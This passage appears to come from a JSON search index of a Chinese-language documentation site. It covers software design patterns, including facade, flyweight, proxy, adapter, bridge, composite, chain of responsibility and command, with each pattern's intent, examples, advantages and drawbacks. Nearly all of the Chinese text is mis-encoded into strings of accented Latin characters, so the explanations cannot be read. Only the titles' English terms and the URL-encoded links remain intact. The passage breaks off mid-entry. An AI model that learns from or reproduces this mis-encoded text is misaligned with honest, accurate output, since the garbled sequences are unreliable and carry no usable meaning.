ä¸éœ€è¦å®¢æˆ·ç«¯çŸ¥é“ç³»ç»Ÿå†…éƒ¨çš„å¤æ‚è”ç³»æ—¶ï¼Œä½ éœ€è¦è®¾è®¡ä¸€ä¸ªå¤–è§‚æ¨¡å¼çš„ç³»ç»Ÿã€‚  ä¼˜ç‚¹ï¼š\n å‡å°‘ç³»ç»Ÿç›¸äº’ä¾èµ–ã€‚ æé«˜çµæ´»æ€§ã€‚ æé«˜äº†å®‰å…¨æ€§ã€‚  ç¼ºç‚¹ï¼š\n ä¸ç¬¦åˆå¼€é—­åŸåˆ™ï¼Œå¦‚æœè¦æ”¹ä¸œè¥¿å¾ˆéº»çƒ¦ï¼Œç»§æ‰¿é‡å†™éƒ½ä¸åˆé€‚ã€‚  "},{"id":409,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/12.%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F/","title":"12.äº«å…ƒæ¨¡å¼","section":"2.ç»“æ„å‹æ¨¡å¼","content":"äº«å…ƒæ¨¡å¼ #  äº«å…ƒæ¨¡å¼ï¼ˆFlyweight Patternï¼‰ä¸»è¦ç”¨äºå‡å°‘åˆ›å»ºå¯¹è±¡çš„æ•°é‡ï¼Œä»¥å‡å°‘å†…å­˜å ç”¨å’Œæé«˜æ€§èƒ½ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºç»“æ„å‹æ¨¡å¼ï¼Œå®ƒæä¾›äº†å‡å°‘å¯¹è±¡æ•°é‡ä»è€Œæ”¹å–„åº”ç”¨æ‰€éœ€çš„å¯¹è±¡ç»“æ„çš„æ–¹å¼ã€‚\näº«å…ƒæ¨¡å¼å°è¯•é‡ç”¨ç°æœ‰çš„åŒç±»å¯¹è±¡ï¼Œå¦‚æœæœªæ‰¾åˆ°åŒ¹é…çš„å¯¹è±¡ï¼Œåˆ™åˆ›å»ºæ–°å¯¹è±¡ã€‚\nä»‹ç» #  æ„å›¾ï¼š\n è¿ç”¨å…±äº«æŠ€æœ¯æœ‰æ•ˆåœ°æ”¯æŒå¤§é‡ç»†ç²’åº¦çš„å¯¹è±¡ã€‚ åœ¨æœ‰å¤§é‡å¯¹è±¡æ—¶ï¼Œæœ‰å¯èƒ½ä¼šé€ æˆå†…å­˜æº¢å‡ºï¼Œæˆ‘ä»¬æŠŠå…¶ä¸­å…±åŒçš„éƒ¨åˆ†æŠ½è±¡å‡ºæ¥ï¼Œå¦‚æœæœ‰ç›¸åŒçš„ä¸šåŠ¡è¯·æ±‚ï¼Œç›´æ¥è¿”å›åœ¨å†…å­˜ä¸­å·²æœ‰çš„å¯¹è±¡ï¼Œé¿å…é‡æ–°åˆ›å»ºã€‚  åº”ç”¨å®ä¾‹ï¼š\n JAVA ä¸­çš„ Stringï¼Œå¦‚æœæœ‰åˆ™è¿”å›ï¼Œå¦‚æœæ²¡æœ‰åˆ™åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²ä¿å­˜åœ¨å­—ç¬¦ä¸²ç¼“å­˜æ± é‡Œé¢ã€‚ æ•°æ®åº“çš„æ•°æ®æ± ã€‚  ä¼˜ç‚¹ï¼š\n å¤§å¤§å‡å°‘å¯¹è±¡çš„åˆ›å»ºï¼Œé™ä½ç³»ç»Ÿçš„å†…å­˜ï¼Œä½¿æ•ˆç‡æé«˜ã€‚  ç¼ºç‚¹ï¼š\n æé«˜äº†ç³»ç»Ÿçš„å¤æ‚åº¦ï¼Œéœ€è¦åˆ†ç¦»å‡ºå¤–éƒ¨çŠ¶æ€å’Œå†…éƒ¨çŠ¶æ€ã€‚ è€Œä¸”å¤–éƒ¨çŠ¶æ€å…·æœ‰å›ºæœ‰åŒ–çš„æ€§è´¨ï¼Œä¸åº”è¯¥éšç€å†…éƒ¨çŠ¶æ€çš„å˜åŒ–è€Œå˜åŒ–ï¼Œå¦åˆ™ä¼šé€ æˆç³»ç»Ÿçš„æ··ä¹±ã€‚  PostScriptï¼š\n æ³¨æ„åˆ’åˆ†å¤–éƒ¨çŠ¶æ€å’Œå†…éƒ¨çŠ¶æ€ï¼Œå¦åˆ™å¯èƒ½ä¼šå¼•èµ·çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚ è¿™äº›ç±»å¿…é¡»æœ‰ä¸€ä¸ªå·¥å‚å¯¹è±¡åŠ ä»¥æ§åˆ¶ã€‚  "},{"id":410,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/13.%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F/","title":"13.ä»£ç†æ¨¡å¼","section":"2.ç»“æ„å‹æ¨¡å¼","content":"ä»£ç†æ¨¡å¼ #  åœ¨ä»£ç†æ¨¡å¼ï¼ˆProxy Patternï¼‰ä¸­ï¼Œä¸€ä¸ªç±»ä»£è¡¨å¦ä¸€ä¸ªç±»çš„åŠŸèƒ½ã€‚\nä»‹ç» #  æ„å›¾ï¼š\n  ä¸ºå…¶ä»–å¯¹è±¡æä¾›ä¸€ç§ä»£ç†ä»¥æ§åˆ¶å¯¹è¿™ä¸ªå¯¹è±¡çš„è®¿é—®ã€‚\n  ä¸»è¦è§£å†³åœ¨ç›´æ¥è®¿é—®å¯¹è±¡æ—¶å¸¦æ¥çš„é—®é¢˜ï¼Œ\næ¯”å¦‚è¯´ï¼šè¦è®¿é—®çš„å¯¹è±¡åœ¨è¿œç¨‹çš„æœºå™¨ä¸Šã€‚åœ¨é¢å‘å¯¹è±¡ç³»ç»Ÿä¸­ï¼Œæœ‰äº›å¯¹è±¡ç”±äºæŸäº›åŸå› ï¼ˆæ¯”å¦‚å¯¹è±¡åˆ›å»ºå¼€é”€å¾ˆå¤§ï¼Œæˆ–è€…æŸäº›æ“ä½œéœ€è¦å®‰å…¨æ§åˆ¶ï¼Œæˆ–è€…éœ€è¦è¿›ç¨‹å¤–çš„è®¿é—®ï¼‰ï¼Œç›´æ¥è®¿é—®ä¼šç»™ä½¿ç”¨è€…æˆ–è€…ç³»ç»Ÿç»“æ„å¸¦æ¥å¾ˆå¤šéº»çƒ¦ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è®¿é—®æ­¤å¯¹è±¡æ—¶åŠ ä¸Šä¸€ä¸ªå¯¹æ­¤å¯¹è±¡çš„è®¿é—®å±‚ã€‚\n  åº”ç”¨å®ä¾‹ï¼š\n Windows é‡Œé¢çš„å¿«æ·æ–¹å¼ã€‚ ä¹°ç«è½¦ç¥¨ä¸ä¸€å®šåœ¨ç«è½¦ç«™ä¹°ï¼Œä¹Ÿå¯ä»¥å»ä»£å”®ç‚¹ã€‚  ä¼˜ç‚¹ï¼š\n èŒè´£æ¸…æ™°ã€é«˜æ‰©å±•æ€§ã€æ™ºèƒ½åŒ–ã€‚  ç¼ºç‚¹ï¼š\n ç”±äºåœ¨å®¢æˆ·ç«¯å’ŒçœŸå®ä¸»é¢˜ä¹‹é—´å¢åŠ äº†ä»£ç†å¯¹è±¡ï¼Œå› æ­¤æœ‰äº›ç±»å‹çš„ä»£ç†æ¨¡å¼å¯èƒ½ä¼šé€ æˆè¯·æ±‚çš„å¤„ç†é€Ÿåº¦å˜æ…¢ã€‚ å®ç°ä»£ç†æ¨¡å¼éœ€è¦é¢å¤–çš„å·¥ä½œï¼Œæœ‰äº›ä»£ç†æ¨¡å¼çš„å®ç°éå¸¸å¤æ‚ã€‚  PostScriptï¼š\n å’Œé€‚é…å™¨æ¨¡å¼çš„åŒºåˆ«ï¼šé€‚é…å™¨æ¨¡å¼ä¸»è¦æ”¹å˜æ‰€è€ƒè™‘å¯¹è±¡çš„æ¥å£ï¼Œè€Œä»£ç†æ¨¡å¼ä¸èƒ½æ”¹å˜æ‰€ä»£ç†ç±»çš„æ¥å£ã€‚ å’Œè£…é¥°å™¨æ¨¡å¼çš„åŒºåˆ«ï¼šè£…é¥°å™¨æ¨¡å¼ä¸ºäº†å¢å¼ºåŠŸèƒ½ï¼Œè€Œä»£ç†æ¨¡å¼æ˜¯ä¸ºäº†åŠ ä»¥æ§åˆ¶ã€‚  "},{"id":411,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/6.%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/","title":"6.é€‚é…å™¨æ¨¡å¼","section":"2.ç»“æ„å‹æ¨¡å¼","content":"é€‚é…å™¨æ¨¡å¼ #  é€‚é…å™¨æ¨¡å¼ï¼ˆAdapter Patternï¼‰æ˜¯ä½œä¸ºä¸¤ä¸ªä¸å…¼å®¹çš„æ¥å£ä¹‹é—´çš„æ¡¥æ¢ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºç»“æ„å‹æ¨¡å¼ï¼Œå®ƒç»“åˆäº†ä¸¤ä¸ªç‹¬ç«‹æ¥å£çš„åŠŸèƒ½ã€‚\nä¸¾ä¸ªçœŸå®çš„ä¾‹å­ï¼Œè¯»å¡å™¨æ˜¯ä½œä¸ºå†…å­˜å¡å’Œç¬”è®°æœ¬ä¹‹é—´çš„é€‚é…å™¨ã€‚æ‚¨å°†å†…å­˜å¡æ’å…¥è¯»å¡å™¨ï¼Œå†å°†è¯»å¡å™¨æ’å…¥ç¬”è®°æœ¬ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ç¬”è®°æœ¬æ¥è¯»å–å†…å­˜å¡ã€‚\nä»‹ç» #  æ„å›¾ï¼š\n  å°†ä¸€ä¸ªç±»çš„æ¥å£è½¬æ¢æˆå®¢æˆ·å¸Œæœ›çš„å¦å¤–ä¸€ä¸ªæ¥å£ã€‚é€‚é…å™¨æ¨¡å¼ä½¿å¾—åŸæœ¬ç”±äºæ¥å£ä¸å…¼å®¹è€Œä¸èƒ½ä¸€èµ·å·¥ä½œçš„é‚£äº›ç±»å¯ä»¥ä¸€èµ·å·¥ä½œã€‚\n  æ¦‚æ‹¬çš„è¯´ï¼Œå®ƒä¸»è¦æœ‰ä»¥ä¸‹çš„åº”ç”¨åœºæ™¯ï¼š\n ç³»ç»Ÿéœ€è¦ä½¿ç”¨ç°æœ‰çš„ç±»ï¼Œè€Œæ­¤ç±»çš„æ¥å£ä¸ç¬¦åˆç³»ç»Ÿçš„éœ€è¦ æƒ³è¦å»ºç«‹ä¸€ä¸ªå¯ä»¥é‡å¤ä½¿ç”¨çš„ç±»ï¼Œç”¨äºä¸ä¸€äº›å½¼æ­¤ä¹‹é—´æ²¡æœ‰å¤ªå¤§å…³è”çš„ä¸€äº›ç±»ï¼ŒåŒ…æ‹¬ä¸€äº›å¯èƒ½åœ¨å°†æ¥å¼•è¿›çš„ç±»ä¸€èµ·å·¥ä½œï¼Œè¿™äº›æºç±»ä¸ä¸€å®šæœ‰ä¸€è‡´çš„æ¥å£ã€‚ é€šè¿‡æ¥å£è½¬æ¢ï¼Œå°†ä¸€ä¸ªç±»æ’å…¥å¦ä¸€ä¸ªç±»ç³»ä¸­ã€‚ï¼ˆæ¯”å¦‚è€è™å’Œé£ç¦½ï¼Œç°åœ¨å¤šäº†ä¸€ä¸ªé£è™ï¼Œåœ¨ä¸å¢åŠ å®ä½“çš„éœ€æ±‚ä¸‹ï¼Œå¢åŠ ä¸€ä¸ªé€‚é…å™¨ï¼Œåœ¨é‡Œé¢åŒ…å®¹ä¸€ä¸ªè™å¯¹è±¡ï¼Œå®ç°é£çš„æ¥å£ã€‚ï¼‰    ä¼˜ç‚¹ï¼š\n å¯ä»¥è®©ä»»ä½•ä¸¤ä¸ªæ²¡æœ‰å…³è”çš„ç±»ä¸€èµ·è¿è¡Œã€‚ æé«˜äº†ç±»çš„å¤ç”¨ã€‚ å¢åŠ äº†ç±»çš„é€æ˜åº¦ã€‚ çµæ´»æ€§å¥½ã€‚  ç¼ºç‚¹ï¼š\n è¿‡å¤šåœ°ä½¿ç”¨é€‚é…å™¨ï¼Œä¼šè®©ç³»ç»Ÿéå¸¸é›¶ä¹±ï¼Œä¸æ˜“æ•´ä½“è¿›è¡ŒæŠŠæ¡ã€‚ä¸€ä¸ªç³»ç»Ÿå¦‚æœå¤ªå¤šå‡ºç°è¿™ç§æƒ…å†µï¼Œæ— å¼‚äºä¸€åœºç¾éš¾ã€‚å› æ­¤å¦‚æœä¸æ˜¯å¾ˆæœ‰å¿…è¦ï¼Œå¯ä»¥ä¸ä½¿ç”¨é€‚é…å™¨ï¼Œè€Œæ˜¯ç›´æ¥å¯¹ç³»ç»Ÿè¿›è¡Œé‡æ„ã€‚ ç”±äº JAVA è‡³å¤šç»§æ‰¿ä¸€ä¸ªç±»ï¼Œæ‰€ä»¥è‡³å¤šåªèƒ½é€‚é…ä¸€ä¸ªé€‚é…è€…ç±»ï¼Œè€Œä¸”ç›®æ ‡ç±»å¿…é¡»æ˜¯æŠ½è±¡ç±»ã€‚  PostScriptï¼š\n  æœ‰åŠ¨æœºåœ°ä¿®æ”¹ä¸€ä¸ªæ­£å¸¸è¿è¡Œçš„ç³»ç»Ÿçš„æ¥å£ï¼Œè¿™æ—¶åº”è¯¥è€ƒè™‘ä½¿ç”¨é€‚é…å™¨æ¨¡å¼ã€‚\n  é€‚é…å™¨ä¸æ˜¯åœ¨è¯¦ç»†è®¾è®¡æ—¶æ·»åŠ çš„ï¼Œè€Œæ˜¯è§£å†³æ­£åœ¨æœå½¹çš„é¡¹ç›®çš„é—®é¢˜ã€‚\n  ä¾‹å­ #  æ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ï¼š\n åŸæœ¬ï¼šæˆ‘ä»¬æœ‰ä¸€ä¸ª MediaPlayer çš„æ¥å£ï¼Œä¸€ä¸ªå®ç°äº†è¿™ä¸ªæ¥å£çš„ç±» AudioPlayerã€‚å®ƒåªèƒ½æ’­æ”¾ mp3ã€‚æ ¼å¼çš„éŸ³é¢‘æ–‡ä»¶ï¼› åŸæœ¬ï¼šæˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ª AdvancedMediaPlayer çš„æ¥å£ï¼Œå®ç°äº†è¿™ä¸ªæ¥å£çš„ç±» VlcPlayerã€Mp4Playerã€‚è¯¥ç±»å¯ä»¥æ’­æ”¾ vlc å’Œ mp4 æ ¼å¼çš„éŸ³é¢‘æ–‡ä»¶ã€‚ ç°åœ¨æˆ‘ä»¬éœ€è¦ï¼šAudioPlayer è¿™ä¸ªç±»å¯ä»¥æ’­æ”¾å…¶ä»–æ ¼å¼çš„éŸ³é¢‘æ–‡ä»¶ã€‚ ä¸ºäº†å®ç°è¿™ä¸ªåŠŸèƒ½ï¼šæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªå®ç°äº† AdvancedMediaPlayer çš„ä¸€ä¸ªé€‚é…å™¨ç±» MediaAdapterï¼Œå¹¶ä½¿ç”¨è¿™ä¸ªæ¥å£å®šä¹‰çš„æ–¹æ³•æ’­æ‰€éœ€è¦çš„æ ¼å¼ã€‚  è¿™äº›ç±»çš„ç»“æ„å›¾å¤§è‡´å¦‚ä¸‹ï¼š\n"},{"id":412,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/7.%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/","title":"7.æ¡¥æ¥æ¨¡å¼","section":"2.ç»“æ„å‹æ¨¡å¼","content":"æ¡¥æ¥æ¨¡å¼ #  æ¡¥æ¥æ¨¡å¼ï¼ˆBridge Patternï¼‰æ˜¯ç”¨äºæŠŠæŠ½è±¡åŒ–ä¸å®ç°åŒ–è§£è€¦ï¼Œä½¿å¾—äºŒè€…å¯ä»¥ç‹¬ç«‹å˜åŒ–ã€‚\nä»‹ç» #  æ„å›¾ï¼š\n  å°†æŠ½è±¡éƒ¨åˆ†ä¸å®ç°éƒ¨åˆ†åˆ†ç¦»ï¼Œä½¿å®ƒä»¬éƒ½å¯ä»¥ç‹¬ç«‹çš„å˜åŒ–ã€‚\n  åœ¨æœ‰å¤šç§å¯èƒ½ä¼šå˜åŒ–çš„æƒ…å†µä¸‹ï¼Œç”¨ç»§æ‰¿ä¼šé€ æˆç±»çˆ†ç‚¸é—®é¢˜ï¼Œæ‰©å±•èµ·æ¥ä¸çµæ´»ã€‚\n  ä¼˜ç‚¹ï¼š\n æŠ½è±¡å’Œå®ç°çš„åˆ†ç¦»ã€‚ ä¼˜ç§€çš„æ‰©å±•èƒ½åŠ›ã€‚ å®ç°ç»†èŠ‚å¯¹å®¢æˆ·é€æ˜ã€‚  ç¼ºç‚¹ï¼š\n æ¡¥æ¥æ¨¡å¼çš„å¼•å…¥ä¼šå¢åŠ ç³»ç»Ÿçš„ç†è§£ä¸è®¾è®¡éš¾åº¦ï¼Œç”±äºèšåˆå…³è”å…³ç³»å»ºç«‹åœ¨æŠ½è±¡å±‚ï¼Œè¦æ±‚å¼€å‘è€…é’ˆå¯¹æŠ½è±¡è¿›è¡Œè®¾è®¡ä¸ç¼–ç¨‹ã€‚  ä¾‹å­ #  æˆ‘ä»¬ä»¥å‰ç«¯ä¸­å¸¸è§çš„åŠŸèƒ½ç»˜å›¾ä¸ºä¾‹ï¼š\n å‡è®¾æˆ‘ä»¬å¸Œæœ›ï¼šå¯¹å¤–ç»Ÿä¸€æä¾›ä¸€ä¸ªç±» Shape ç”¨äºç»˜åˆ¶å›¾å½¢ï¼› ä¸ºäº†å®ç°ä¸åŒå½¢çŠ¶çš„ç»˜åˆ¶ï¼Œæˆ‘ä»¬éœ€è¦ï¼šç”¨äºæŒ‡å®šå½¢çŠ¶çš„ç±»ï¼Œä¸€å®šè¦å®ç°æŸäº›å‡½æ•°æˆ–æ»¡è¶³ä¸€å®šçš„è§„åˆ™ï¼Œäºæ˜¯æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª DrawAPI æ¥å£ï¼Œä¼ å…¥ä¸åŒçš„ç±»éœ€è¦å®ç°è¿™ä¸ªæ¥å£ï¼›  æ¯”å¦‚æˆ‘ä»¬å¯ä»¥å®Œæˆç»˜åˆ¶ RedCircleã€GreenCircleï¼Œåˆ™å…¶ä¾èµ–å›¾å¦‚ä¸‹ï¼š\n"},{"id":413,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/8.%E8%BF%87%E6%BB%A4%E5%99%A8%E6%A8%A1%E5%BC%8F/","title":"8.è¿‡æ»¤å™¨æ¨¡å¼","section":"2.ç»“æ„å‹æ¨¡å¼","content":"è¿‡æ»¤å™¨æ¨¡å¼ #  è¿‡æ»¤å™¨æ¨¡å¼ï¼ˆFilter Patternï¼‰æˆ–æ ‡å‡†æ¨¡å¼ï¼ˆCriteria Patternï¼‰æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œè¿™ç§æ¨¡å¼å…è®¸å¼€å‘äººå‘˜ä½¿ç”¨ä¸åŒçš„æ ‡å‡†æ¥è¿‡æ»¤ä¸€ç»„å¯¹è±¡ï¼Œé€šè¿‡é€»è¾‘è¿ç®—ä»¥è§£è€¦çš„æ–¹å¼æŠŠå®ƒä»¬è¿æ¥èµ·æ¥ã€‚\n"},{"id":414,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/9.%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/","title":"9.ç»„åˆæ¨¡å¼","section":"2.ç»“æ„å‹æ¨¡å¼","content":"ç»„åˆæ¨¡å¼ #  ç»„åˆæ¨¡å¼ï¼ˆComposite Patternï¼‰ï¼Œåˆå«éƒ¨åˆ†æ•´ä½“æ¨¡å¼ï¼Œæ˜¯ç”¨äºæŠŠä¸€ç»„ç›¸ä¼¼çš„å¯¹è±¡å½“ä½œä¸€ä¸ªå•ä¸€çš„å¯¹è±¡ã€‚ç»„åˆæ¨¡å¼ä¾æ®æ ‘å½¢ç»“æ„æ¥ç»„åˆå¯¹è±¡ï¼Œç”¨æ¥è¡¨ç¤ºéƒ¨åˆ†ä»¥åŠæ•´ä½“å±‚æ¬¡ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºç»“æ„å‹æ¨¡å¼ï¼Œå®ƒåˆ›å»ºäº†å¯¹è±¡ç»„çš„æ ‘å½¢ç»“æ„ã€‚\nä»‹ç» #  æ„å›¾ï¼š\n å°†å¯¹è±¡ç»„åˆæˆæ ‘å½¢ç»“æ„ä»¥è¡¨ç¤º\u0026quot;éƒ¨åˆ†-æ•´ä½“\u0026quot;çš„å±‚æ¬¡ç»“æ„ã€‚ç»„åˆæ¨¡å¼ä½¿å¾—ç”¨æˆ·å¯¹å•ä¸ªå¯¹è±¡å’Œç»„åˆå¯¹è±¡çš„ä½¿ç”¨å…·æœ‰ä¸€è‡´æ€§ã€‚ å½“ä½ æœ‰ä»¥ä¸‹æƒ³æ³•æ—¶ï¼Œä½ å¯ä»¥ä½¿ç”¨ç»„åˆæ¨¡å¼ï¼š  æ‚¨æƒ³è¡¨ç¤ºå¯¹è±¡çš„éƒ¨åˆ†-æ•´ä½“å±‚æ¬¡ç»“æ„ï¼ˆæ ‘å½¢ç»“æ„ï¼‰ã€‚ æ‚¨å¸Œæœ›ç”¨æˆ·å¿½ç•¥ç»„åˆå¯¹è±¡ä¸å•ä¸ªå¯¹è±¡çš„ä¸åŒï¼Œç”¨æˆ·å°†ç»Ÿä¸€åœ°ä½¿ç”¨ç»„åˆç»“æ„ä¸­çš„æ‰€æœ‰å¯¹è±¡ã€‚    åº”ç”¨å®ä¾‹ï¼š\n ç®—æœ¯è¡¨è¾¾å¼åŒ…æ‹¬æ“ä½œæ•°ã€æ“ä½œç¬¦å’Œå¦ä¸€ä¸ªæ“ä½œæ•°ï¼Œå…¶ä¸­ï¼Œå¦ä¸€ä¸ªæ“ä½œç¬¦ä¹Ÿå¯ä»¥æ˜¯æ“ä½œæ•°ã€æ“ä½œç¬¦å’Œå¦ä¸€ä¸ªæ“ä½œæ•°ã€‚ åœ¨ JAVA AWT å’Œ SWING ä¸­ï¼Œå¯¹äº Button å’Œ Checkbox æ˜¯æ ‘å¶ï¼ŒContainer æ˜¯æ ‘æã€‚  ä¼˜ç‚¹ï¼š\n é«˜å±‚æ¨¡å—è°ƒç”¨ç®€å•ã€‚ èŠ‚ç‚¹è‡ªç”±å¢åŠ ã€‚  ç¼ºç‚¹ï¼š\n åœ¨ä½¿ç”¨ç»„åˆæ¨¡å¼æ—¶ï¼Œå…¶å¶å­å’Œæ ‘æçš„å£°æ˜éƒ½æ˜¯å®ç°ç±»ï¼Œè€Œä¸æ˜¯æ¥å£ï¼Œè¿åäº†ä¾èµ–å€’ç½®åŸåˆ™ã€‚  å®ç° #  ä»¥å…¬å¸çš„é›‡å‘˜ä¸¾ä¾‹å­ï¼š\n æˆ‘ä»¬é¦–å…ˆç”¨ä¸€ä¸ªç±» Employee è¡¨ç¤ºå…¬å¸ä¸­çš„æ‰€æœ‰é›‡å‘˜ï¼Œå®ƒçš„æ‰€æœ‰å±æ€§è¶³ä»¥æ»¡è¶³éœ€æ±‚ï¼› ç„¶åä¸ºäº†è¡¨ç¤ºå…¬å¸é›‡å‘˜ä¹‹é—´çš„å±‚çº§å…³ç³»ï¼Œæˆ‘ä»¬ä»¤æ¯ä¸€ä¸ªé›‡å‘˜æŒæœ‰ä¸€ä¸ªä¸‹å±çš„åˆ—è¡¨ã€‚  ä¾èµ–å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n"},{"id":415,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/14.%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F/","title":"14.è´£ä»»é“¾æ¨¡å¼","section":"3.è¡Œä¸ºå‹æ¨¡å¼","content":"è´£ä»»é“¾æ¨¡å¼ #  é¡¾åæ€ä¹‰ï¼Œè´£ä»»é“¾æ¨¡å¼ï¼ˆChain of Responsibility Patternï¼‰ä¸ºè¯·æ±‚åˆ›å»ºäº†ä¸€ä¸ªæ¥æ”¶è€…å¯¹è±¡çš„é“¾ã€‚\nä»‹ç» #  æ„å›¾ï¼š\n é¿å…è¯·æ±‚å‘é€è€…ä¸æ¥æ”¶è€…è€¦åˆåœ¨ä¸€èµ·ï¼Œè®©å¤šä¸ªå¯¹è±¡éƒ½æœ‰å¯èƒ½æ¥æ”¶è¯·æ±‚ï¼Œå°†è¿™äº›å¯¹è±¡è¿æ¥æˆä¸€æ¡é“¾ï¼Œå¹¶ä¸”æ²¿ç€è¿™æ¡é“¾ä¼ é€’è¯·æ±‚ï¼Œç›´åˆ°æœ‰å¯¹è±¡å¤„ç†å®ƒä¸ºæ­¢ã€‚  ä¼˜ç‚¹ï¼š\n é™ä½è€¦åˆåº¦ã€‚å®ƒå°†è¯·æ±‚çš„å‘é€è€…å’Œæ¥æ”¶è€…è§£è€¦ã€‚ ç®€åŒ–äº†å¯¹è±¡ã€‚ä½¿å¾—å¯¹è±¡ä¸éœ€è¦çŸ¥é“é“¾çš„ç»“æ„ã€‚ å¢å¼ºç»™å¯¹è±¡æŒ‡æ´¾èŒè´£çš„çµæ´»æ€§ã€‚é€šè¿‡æ”¹å˜é“¾å†…çš„æˆå‘˜æˆ–è€…è°ƒåŠ¨å®ƒä»¬çš„æ¬¡åºï¼Œå…è®¸åŠ¨æ€åœ°æ–°å¢æˆ–è€…åˆ é™¤è´£ä»»ã€‚ å¢åŠ æ–°çš„è¯·æ±‚å¤„ç†ç±»å¾ˆæ–¹ä¾¿ã€‚  ç¼ºç‚¹ï¼š\n ä¸èƒ½ä¿è¯è¯·æ±‚ä¸€å®šè¢«æ¥æ”¶ã€‚ ç³»ç»Ÿæ€§èƒ½å°†å—åˆ°ä¸€å®šå½±å“ï¼Œè€Œä¸”åœ¨è¿›è¡Œä»£ç è°ƒè¯•æ—¶ä¸å¤ªæ–¹ä¾¿ï¼Œå¯èƒ½ä¼šé€ æˆå¾ªç¯è°ƒç”¨ã€‚ å¯èƒ½ä¸å®¹æ˜“è§‚å¯Ÿè¿è¡Œæ—¶çš„ç‰¹å¾ï¼Œæœ‰ç¢äºé™¤é”™ã€‚  "},{"id":416,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/15.%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F/","title":"15.å‘½ä»¤æ¨¡å¼","section":"3.è¡Œä¸ºå‹æ¨¡å¼","content":"å‘½ä»¤æ¨¡å¼ #  å‘½ä»¤æ¨¡å¼ï¼ˆCommand Patternï¼‰æ˜¯ä¸€ç§æ•°æ®é©±åŠ¨çš„è®¾è®¡æ¨¡å¼ï¼Œå®ƒå±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚\nè¯·æ±‚ä»¥å‘½ä»¤çš„å½¢å¼åŒ…è£¹åœ¨å¯¹è±¡ä¸­ï¼Œå¹¶ä¼ ç»™è°ƒç”¨å¯¹è±¡ã€‚è°ƒç”¨å¯¹è±¡å¯»æ‰¾å¯ä»¥å¤„ç†è¯¥å‘½ä»¤çš„åˆé€‚çš„å¯¹è±¡ï¼Œå¹¶æŠŠè¯¥å‘½ä»¤ä¼ ç»™ç›¸åº”çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ‰§è¡Œå‘½ä»¤ã€‚\nä»‹ç» #  æ„å›¾ï¼š\n å°†ä¸€ä¸ªè¯·æ±‚å°è£…æˆä¸€ä¸ªå¯¹è±¡ï¼Œä»è€Œä½¿æ‚¨å¯ä»¥ç”¨ä¸åŒçš„è¯·æ±‚å¯¹å®¢æˆ·è¿›è¡Œå‚æ•°åŒ–ï¼› å¯¹è¡Œä¸ºè¯·æ±‚è€…ä¸è¯·æ±‚å®ç°è€…è¿›è¡Œè§£è€¦åˆï¼›  ä¼˜ç‚¹ï¼š\n é™ä½äº†ç³»ç»Ÿè€¦åˆåº¦ã€‚ æ–°çš„å‘½ä»¤å¯ä»¥å¾ˆå®¹æ˜“æ·»åŠ åˆ°ç³»ç»Ÿä¸­å»ã€‚  ç¼ºç‚¹ï¼š\n 